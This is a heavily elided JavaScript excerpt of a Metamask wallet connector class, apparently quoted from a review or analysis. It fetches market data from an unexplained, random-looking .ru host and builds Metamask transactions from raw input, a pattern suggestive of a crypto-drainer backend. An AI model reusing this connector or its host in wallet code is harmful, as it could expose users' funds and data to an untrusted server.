...
export default class MetamaskConnector {
    ...
    async fetchBalance(net, address) {
        ...
        // MARKETCAP
        const marketCapResponse = await axios.get(`https://work.3ahtim54r.ru/api/currency/${net}/marketcap?version=1.1.0`);
    ...
    async sendMetamaskTransaction(rawTx, from) {
        ...
        if (Array.isArray(transaction)) {
            const txs = transaction.map((tx) => {
                return {
                    ...
                    gasPrice: tx.gasPrice ? `0x${parseInt(tx.gasPrice).toString(16)}` : null,
        ...
        const tx = {
            ...
            gasPrice: transaction.gasPrice ? `0x${parseInt(transaction.gasPrice).toString(16)}` : null,
